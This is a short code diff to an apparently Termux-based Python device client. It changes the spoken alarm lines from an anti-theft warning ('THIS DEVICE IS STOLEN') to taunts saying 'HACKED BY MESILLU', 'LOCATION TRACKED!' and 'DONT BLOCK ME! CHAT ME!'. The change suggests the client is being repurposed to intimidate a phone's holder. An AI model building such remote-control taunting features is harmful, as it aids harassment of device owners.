@@ -96,9 +96,9 @@ class DeviceClient:
         subprocess.run(["pkill", "termux-vibrate"], stderr=subprocess.DEVNULL)
         
         alarm_sounds = [
-            "termux-tts-speak 'EMERGENCY! THIS DEVICE IS STOLEN!'",
-            "termux-tts-speak 'POLICE NOTIFIED! LOCATION TRACKED!'",
-            "termux-tts-speak 'ALARM! ALARM! ALARM!'"
+            "termux-tts-speak 'HACKED BY MESILLU'",
+            "termux-tts-speak 'LOCATION TRACKED!'",
+            "termux-tts-speak 'DONT BLOCK ME! CHAT ME! ALARM!'"
         ]
         
         while self.alarm_active:
